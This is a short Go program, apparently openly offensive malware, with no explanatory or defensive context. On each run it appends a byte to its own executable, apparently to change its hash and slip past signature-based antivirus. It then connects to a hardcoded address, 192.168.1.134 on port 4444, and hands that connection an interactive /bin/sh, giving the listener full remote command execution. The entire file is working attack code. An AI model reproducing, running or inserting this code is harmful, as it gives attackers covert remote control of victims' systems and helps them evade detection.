package main

import (
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
)

func main() {
	changeSig()
	rSh()
}

func changeSig() {
	filePath, err := os.Executable()
	if err != nil {
		log.Fatal(err)
	}

	content, err := os.ReadFile(filePath)
	if err != nil {
		log.Fatal(err)
	}

	content = append(content, byte(0))

	tmpFilePath := filepath.Join(filepath.Dir(filePath), "tmpexec")
	err = os.WriteFile(tmpFilePath, []byte{}, 0777)
	if err != nil {
		log.Fatal(err)
	}

	err = os.WriteFile(tmpFilePath, content, 0777)
	if err != nil {
		log.Fatal(err)
	}

	err = os.Rename(tmpFilePath, filePath)
	if err != nil {
		log.Fatal(err)
	}
}

func rSh() {
	ip := "192.168.1.134"
	port := "4444"
	conn, err := net.Dial("tcp", ip + ":" + port)
	if err != nil {
		os.Exit(1)
	}
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}
